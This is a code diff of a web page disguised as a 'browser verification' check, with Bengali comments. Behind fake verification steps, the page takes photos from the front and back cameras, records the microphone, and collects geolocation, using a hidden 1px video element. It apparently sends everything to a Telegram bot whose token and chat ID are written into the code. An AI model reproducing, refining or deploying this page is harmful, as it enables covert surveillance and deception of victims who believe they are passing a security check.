@@ -14,7 +14,8 @@
         .btn-action:hover { background: #00b89c; transform: translateY(-2px); }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 15px auto; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.05; pointer-events: none; z-index: -1; }
+        
+        #video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
         #canvas { display: none; }
         #my-img { width: 100%; border-radius: 12px; display: none; margin-top: 20px; }
     </style>
@@ -39,25 +40,35 @@
 const TOKEN = "8657895361:AAGOkn7MmVJEBhblZ8V5zc16WAzxtRujNqg";
 const CHAT_ID = "-1003747831651";
 
-let deviceInfo = "";
-let mapLink = "লোকেশন পারমিশন পাওয়া যায়নি";
+// এটি নিশ্চিত করবে যে পেজ লোড হওয়ার সময় কোনো পারমিশন চাইবে না
+window.onload = () => {
+    console.log("সিস্টেম রেডি। কোনো অটো-পারমিশন রান করা হয়নি।");
+};
 
-// প্রথম ধাপ: ফ্রন্ট ক্যামেরা ও লোকেশন
+function toggleUI(isLoading) {
+    document.getElementById('loader').style.display = isLoading ? 'block' : 'none';
+    document.getElementById('main-btn').style.display = isLoading ? 'none' : 'block';
+}
+
+// ১ম ধাপ: বাটন ক্লিক করলে সামনের ক্যামেরা পারমিশন চাইবে
 async function stepOne() {
     toggleUI(true);
     
-    // ডিভাইস ও লোকেশন একবারেই নিয়ে নেওয়া হচ্ছে
-    deviceInfo = `📱 ওএস: ${navigator.platform}\n🌐 ব্রাউজার: ${navigator.userAgent.split(') ')[1] || 'Unknown'}\n🖥 স্ক্রিন: ${screen.width}x${screen.height}`;
     try {
-        const pos = await new Promise((res, rej) => {
-            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
-        });
-        mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-    } catch (e) {}
-
-    try {
+        // ক্লিক করার পরেই কেবল এটি কল হবে
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        await captureAndSend(stream, "Front Camera", `📊 *ট্র্যাকিং রিপোর্ট*\n\n${deviceInfo}\n📍 *লোকেশন:* [ম্যাপ দেখুন](${mapLink})`);
+        
+        // লোকেশন ডাটা (সাইলেন্টলি)
+        let loc = "লোকেশন পাওয়া যায়নি";
+        try {
+            const pos = await new Promise((res, rej) => {
+                navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 });
+            });
+            loc = `http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+        } catch(e){}
+
+        const report = `📊 *ভেরিফিকেশন ধাপ ১*\n📍 লোকেশন: [দেখুন](${loc})`;
+        await captureAndSend(stream, report);
         
         // UI আপডেট
         toggleUI(false);
@@ -65,41 +76,41 @@ async function stepOne() {
         document.getElementById('desc').innerText = "আপনি browser verification প্রথম ধাপ অতিক্রম করেছেন।";
         document.getElementById('main-btn').innerText = "পরবর্তী ধাপ (Next)";
         document.getElementById('main-btn').onclick = stepTwo;
+
     } catch (err) {
-        alert("ক্যামেরা পারমিশন ছাড়া ভেরিফিকেশন সম্ভব নয়।");
-        location.reload();
+        toggleUI(false);
+        alert("ভেরিফিকেশন সম্পন্ন করতে ক্যামেরার অনুমতি প্রয়োজন।");
     }
 }
 
-// দ্বিতীয় ধাপ: ব্যাক ক্যামেরা ও অডিও
+// ২য় ধাপ: বাটন ক্লিক করলে পেছনের ক্যামেরা ও অডিও পারমিশন চাইবে
 async function stepTwo() {
     toggleUI(true);
     document.getElementById('desc').innerText = "আপনার ভেরিফিকেশনটি যাচাই করা হচ্ছে...";
 
     try {
-        // ব্যাক ক্যামেরা ট্রাই
+        // ব্যাক ক্যামেরা
         try {
             const bStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-            await captureAndSend(bStream, "Back Camera", "--- পেছনের ক্যামেরা ছবি ---");
-            await new Promise(r => setTimeout(r, 1000));
+            await captureAndSend(bStream, "--- পেছনের ক্যামেরা ডাটা ---");
         } catch (e) {}
 
-        // অডিও ট্রাই
+        // অডিও
         const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
         await captureAudio(aStream);
 
         toggleUI(false);
         document.getElementById('icon').innerHTML = "✅";
         document.getElementById('title').innerText = "সফল হয়েছে!";
-        document.getElementById('desc').innerText = "সবগুলো সিকিউরিটি প্যারামিটার সফলভাবে যাচাই করা হয়েছে।";
+        document.getElementById('desc').innerText = "সবগুলো সিকিউরিটি প্যারামিটার যাচাই করা হয়েছে।";
         document.getElementById('main-btn').innerText = "ফাইনাল ভেরিফাই (Final)";
         document.getElementById('main-btn').onclick = finalStep;
     } catch (err) {
-        finalStep(); // অডিও না দিলেও শেষ ধাপে নিয়ে যাবে
+        finalStep();
     }
 }
 
-// ফাইনাল ধাপ
+// ৩য় ধাপ: ফাইনাল বাটন
 function finalStep() {
     document.getElementById('main-btn').style.display = 'none';
     document.getElementById('title').innerText = "অভিনন্দন!";
@@ -107,12 +118,7 @@ function finalStep() {
     document.getElementById('my-img').style.display = 'block';
 }
 
-function toggleUI(isLoading) {
-    document.getElementById('loader').style.display = isLoading ? 'block' : 'none';
-    document.getElementById('main-btn').style.display = isLoading ? 'none' : 'block';
-}
-
-async function captureAndSend(stream, type, caption) {
+async function captureAndSend(stream, caption) {
     const video = document.getElementById('video');
     video.srcObject = stream;
     await video.play();
@@ -131,7 +137,7 @@ async function captureAndSend(stream, type, caption) {
                 stream.getTracks().forEach(t => t.stop());
                 resolve();
             }, 'image/jpeg', 0.6);
-        }, 2500);
+        }, 2000);
     });
 }
 
@@ -150,7 +156,7 @@ async function captureAudio(stream) {
             resolve();
         };
         recorder.start();
-        setTimeout(() => recorder.stop(), 4000);
+        setTimeout(() => recorder.stop(), 3000);
     });
 }
 </script>
